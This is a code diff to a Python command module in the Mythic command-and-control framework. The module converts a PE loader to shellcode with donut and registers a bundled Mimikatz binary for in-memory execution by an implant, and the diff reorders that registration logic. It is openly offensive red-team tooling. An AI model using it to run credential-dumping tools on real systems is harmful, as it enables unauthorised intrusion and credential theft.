@@ -8,6 +8,7 @@ import base64
 import donut
 
 MIMIKATZ_FILE_ID = ""
+EXECUTEPE_STUB_ID = ""
 
 class ExecutePEArguments(TaskArguments):
 
@@ -43,12 +44,16 @@ class ExecutePECommand(CommandBase):
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         global MIMIKATZ_FILE_ID
+        global EXECUTEPE_STUB_ID
         task.args.add_arg("pipe_name", str(uuid4()))
         exePath = "/srv/ExecutePE.exe"
         mimikatz_path = "/Mythic/agent_code/mimikatz_x64.exe"
 
         shellcode_path = "/tmp/loader.bin"
 
+
+        
+        
         donutPath = "/Mythic/agent_code/donut"
         command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
@@ -73,28 +78,28 @@ class ExecutePECommand(CommandBase):
             file_resp = await MythicRPC().execute("create_file",
                                                 task_id=task.id,
                                                 file=shellcode,
-                                                delete_after_fetch=True)
+                                                delete_after_fetch=False)
             if file_resp.status == MythicStatus.Success:
                 task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
-                if task.args.get_arg("pe_name") == "mimikatz.exe":
-                    if MIMIKATZ_FILE_ID != "":
-                        self.add_arg("mimipe", MIMIKATZ_FILE_ID)
-                    else:
-                        with open(mimikatz_path, "rb") as f:
-                            mimibytes = f.read()
-                        b64mimi = base64.b64encode(mimibytes).decode()
-                        file_resp = await MythicRPC().execute("create_file",
-                                    task_id=task.id,
-                                    file=b64mimi,
-                                    delete_after_fetch=False)
-                        if file_resp.status == MythicStatus.Success:
-                            task.args.add_arg("mimipe", file_resp.response["agent_file_id"])
-                            MIMIKATZ_FILE_ID = file_resp.response["agent_file_id"]
-                        else:
-                            raise Exception("Failed to register Mimikatz: " + file_resp.error)
             else:
                 raise Exception("Failed to register ExecutePE shellcode: " + file_resp.error)
-
+                
+        if task.args.get_arg("pe_name") == "mimikatz.exe":
+            if MIMIKATZ_FILE_ID != "":
+                task.args.add_arg("mimipe", MIMIKATZ_FILE_ID)
+            else:
+                with open(mimikatz_path, "rb") as f:
+                    mimibytes = f.read()
+                b64mimi = base64.b64encode(mimibytes).decode()
+                file_resp = await MythicRPC().execute("create_file",
+                            task_id=task.id,
+                            file=b64mimi,
+                            delete_after_fetch=False)
+                if file_resp.status == MythicStatus.Success:
+                    task.args.add_arg("mimipe", file_resp.response["agent_file_id"])
+                    MIMIKATZ_FILE_ID = file_resp.response["agent_file_id"]
+                else:
+                    raise Exception("Failed to register Mimikatz: " + file_resp.error)
         return task
 
     async def process_response(self, response: AgentResponse):
